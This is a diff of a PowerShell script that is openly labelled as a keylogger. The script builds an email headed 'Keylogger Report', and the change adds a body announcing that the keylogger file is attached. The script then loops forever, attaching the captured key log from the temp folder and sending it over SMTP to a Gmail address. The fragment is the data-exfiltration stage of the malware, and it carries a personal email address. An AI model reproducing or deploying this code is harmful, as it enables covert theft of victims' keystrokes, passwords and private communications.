@@ -6,6 +6,7 @@ $message = New - Object System.Net.Mail.MailMessage
 $message.From = 'zaghum.mughal.1@gmail.com'
 $message.To.Add('zaghum.mughal.1@gmail.com')
 $message.Subject = 'Keylogger Report'
+$message.Body = 'Success! The keylogger file is attached!'
 while (1) {
     $message.Attachments.Add("$ENV:temp\key.log");
     $SMTPInfo.Send($message);
